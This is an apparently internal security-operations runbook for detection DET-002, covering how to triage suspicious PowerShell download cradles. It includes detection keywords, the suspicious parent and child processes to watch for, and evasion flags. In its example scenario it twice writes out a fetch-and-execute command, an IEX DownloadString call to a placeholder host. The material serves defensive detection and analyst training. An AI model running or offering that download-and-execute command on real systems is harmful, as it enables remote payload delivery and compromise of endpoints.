# DET-002 — Suspicious PowerShell Download Cradle

## Alert Description

This detection identifies PowerShell processes using command-line patterns commonly associated with retrieving remote content or scripts.

Examples include:

- `Invoke-WebRequest`
- `iwr`
- `DownloadString`
- `DownloadFile`
- `WebClient`
- `Start-BitsTransfer`
- `curl`
- `wget`

These commands are not inherently malicious. However, attackers frequently use PowerShell to download payloads, scripts, tooling, or second-stage content from remote infrastructure.

---

## Detection Objective

Identify PowerShell-based remote content retrieval that may represent:

- malware delivery;
- second-stage payload retrieval;
- script-based execution;
- attacker tooling download;
- ingress tool transfer;
- post-exploitation activity.

The alert should be treated as a **triage signal**, not automatic proof of compromise.

---

## MITRE ATT&CK Mapping

### T1059.001 — Command and Scripting Interpreter: PowerShell

PowerShell may be used to execute commands, scripts, and malicious payloads.

### T1105 — Ingress Tool Transfer

Attackers may transfer files, tools, or payloads into a compromised environment from external infrastructure.

### Primary Tactics

- Execution
- Command and Control

---

## Initial Triage

When DET-002 triggers, collect and review:

1. Hostname
2. User account
3. PowerShell process ID
4. Parent process
5. Full command line
6. Referenced URL or domain
7. Destination file path, if present
8. Child processes
9. Network connections
10. DNS lookups
11. Downloaded file hashes
12. Related alerts on the same endpoint

---

## Key Questions

The analyst should determine:

- Was PowerShell expected for this user or system?
- Is the parent process legitimate?
- What resource was PowerShell attempting to retrieve?
- Is the destination domain trusted?
- Was a file downloaded or was content executed directly in memory?
- Did PowerShell launch another process afterward?
- Did the downloaded content create persistence or modify security controls?
- Is similar activity occurring on other endpoints?

---

## High-Risk Parent Processes

Increase investigation priority when PowerShell was launched by an unusual or user-facing application such as:

```text
winword.exe
excel.exe
outlook.exe
powerpnt.exe
mshta.exe
wscript.exe
cscript.exe
rundll32.exe
regsvr32.exe
cmd.exe
```

Example suspicious process chain:

```text
winword.exe
    ↓
powershell.exe
    ↓
DownloadString(...)
    ↓
remote payload
```

An Office application launching PowerShell and immediately retrieving remote content should generally receive greater scrutiny than PowerShell launched from an approved administration workflow.

---

## Command-Line Analysis

Review the entire PowerShell command line.

### Example indicators

```text
Invoke-WebRequest
```

```text
iwr
```

```text
(New-Object Net.WebClient).DownloadString(...)
```

```text
(New-Object Net.WebClient).DownloadFile(...)
```

```text
Start-BitsTransfer
```

```text
curl
```

```text
wget
```

Also inspect for execution primitives such as:

```text
IEX
Invoke-Expression
```

For example:

```text
powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/payload.ps1')"
```

This pattern is higher risk because the retrieved script may be executed directly rather than simply saved to disk.

---

## URL and Domain Investigation

Extract any URL, hostname, or IP address from the command line.

Example:

```text
https://example.invalid/payload.ps1
```

Investigate:

- domain reputation;
- domain age;
- whether the domain is expected in the organization;
- DNS resolution;
- destination IP;
- TLS certificate information where available;
- related proxy or firewall activity;
- whether other systems contacted the same infrastructure.

Potentially suspicious characteristics include:

- newly registered domains;
- raw IP-address URLs;
- URL shorteners;
- uncommon top-level domains;
- dynamic DNS;
- previously unseen domains;
- suspicious file extensions;
- encoded or heavily obfuscated URLs.

---

## Downloaded File Analysis

If the command downloads a file, collect:

```text
filename
full path
size
SHA256 hash
creation time
execution status
```

Determine whether the downloaded artifact was subsequently:

- executed;
- loaded into PowerShell;
- launched by another interpreter;
- copied elsewhere;
- added to persistence;
- deleted after execution.

If available, correlate the hash with:

- EDR telemetry;
- antivirus detections;
- threat-intelligence platforms;
- internal prevalence data.

---

## Network Correlation

Review endpoint and network telemetry around the alert timestamp.

Useful sources include:

- EDR network events;
- firewall logs;
- proxy logs;
- DNS telemetry;
- web-filter logs;
- TLS inspection logs.

Look for:

```text
PowerShell process
        ↓
DNS lookup
        ↓
Outbound HTTP/HTTPS connection
        ↓
Remote content retrieval
```

A matching network connection significantly strengthens the evidence that the command actually reached external infrastructure.

---

## Child-Process Investigation

Determine whether PowerShell subsequently spawned another executable.

Potentially suspicious child processes include:

```text
cmd.exe
rundll32.exe
regsvr32.exe
mshta.exe
wscript.exe
cscript.exe
schtasks.exe
reg.exe
certutil.exe
bitsadmin.exe
```

Example:

```text
powershell.exe
      ↓
DownloadString(...)
      ↓
cmd.exe
      ↓
payload.exe
```

Follow-on execution increases the likelihood that the event represents malicious activity.

---

## Related PowerShell Activity

Review nearby PowerShell events for:

- encoded commands;
- execution-policy bypass;
- hidden windows;
- Base64 content;
- AMSI bypass attempts;
- Defender exclusions;
- credential-related commands;
- persistence creation;
- reconnaissance commands.

Examples of additional suspicious arguments:

```text
-EncodedCommand
-ExecutionPolicy Bypass
-WindowStyle Hidden
-NoProfile
-Noni
```

A combination of download behavior and obfuscation or execution bypass should increase investigation priority.

---

## Escalation Indicators

Escalate the alert when one or more of the following are present:

- PowerShell was launched by Microsoft Office.
- The destination domain is unknown or malicious.
- The command uses `IEX` or `Invoke-Expression`.
- Remote content executes directly in memory.
- A downloaded executable or script is subsequently launched.
- The command is encoded or heavily obfuscated.
- PowerShell launches suspicious child processes.
- The host makes additional suspicious outbound connections.
- Security controls are disabled or modified.
- Persistence is established.
- The user does not normally execute PowerShell.
- Similar activity appears across multiple hosts.

---

## False Positives

Legitimate activity may include:

- administrative scripts;
- software installation;
- package deployment;
- configuration-management tools;
- endpoint-management systems;
- internal automation;
- approved troubleshooting scripts;
- developer workflows.

A legitimate download alone should not automatically close the alert.

Validate:

```text
User
+
Parent process
+
Destination
+
Command purpose
+
Downloaded artifact
+
Follow-on behavior
```

---

## Suggested Triage Flow

```text
DET-002 Alert
     |
     v
Identify user + endpoint
     |
     v
Review full PowerShell command
     |
     v
Extract URL/domain
     |
     +---- Known approved destination?
     |             |
     |            Yes
     |             |
     |      Validate business context
     |
     v
Investigate parent process
     |
     v
Check network telemetry
     |
     v
Identify downloaded content
     |
     v
Check child processes / execution
     |
     v
Determine benign vs suspicious
```

---

## Analyst Decision

### Benign / Expected

Close as benign when:

- the command belongs to an approved administrative workflow;
- the user or service account is expected to perform the action;
- the destination is trusted;
- the downloaded content is known and authorized;
- no suspicious process, network, or persistence activity follows.

Document the business justification.

### Suspicious

Escalate when:

- the destination cannot be explained;
- PowerShell was launched from an unusual parent;
- a script or executable was retrieved from untrusted infrastructure;
- the command is obfuscated;
- downloaded content was subsequently executed;
- additional suspicious endpoint or network activity exists.

### Confirmed Malicious

Treat as malicious when evidence demonstrates attacker-controlled payload delivery or execution.

Potential response actions may include:

- isolate the endpoint;
- block malicious domains/IPs;
- quarantine downloaded artifacts;
- terminate malicious processes;
- disable or reset compromised accounts where justified;
- hunt for the same indicators across the environment;
- preserve forensic evidence;
- escalate according to the incident-response process.

---

## Evidence to Preserve

Collect and preserve:

- complete PowerShell command line;
- process ID;
- parent process and parent PID;
- user account;
- hostname;
- timestamp;
- URL/domain/IP;
- DNS results;
- network connections;
- downloaded filename and path;
- SHA256 hash;
- child processes;
- related PowerShell events;
- EDR detections;
- proxy/firewall evidence;
- relevant threat-intelligence results.

---

## Example Detection Scenario

### Process Event

```text
Image:
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

CommandLine:
powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/payload.ps1')"

User:
LAB\test-user
```

### Detection Reason

```text
PowerShell executable
        +
WebClient
        +
DownloadString
        =
DET-002 match
```

### Expected Analyst Action

The analyst should investigate the URL, determine whether content was retrieved, identify any subsequent execution, and correlate the activity with endpoint and network telemetry.

---

## Detection Limitations

DET-002 is intentionally behavioral and may produce legitimate administrative matches.

It may also miss:

- heavily obfuscated PowerShell;
- custom .NET download methods;
- downloads performed by other interpreters;
- PowerShell activity where command-line telemetry is unavailable;
- malicious content delivered without recognizable download keywords.

For this reason, DET-002 should be combined with additional telemetry and detections rather than used as a standalone compromise verdict.

---

## Final Analyst Principle

> A PowerShell download command is an investigative lead. Its security significance depends on who executed it, what launched it, where the content came from, what was retrieved, and what happened next.
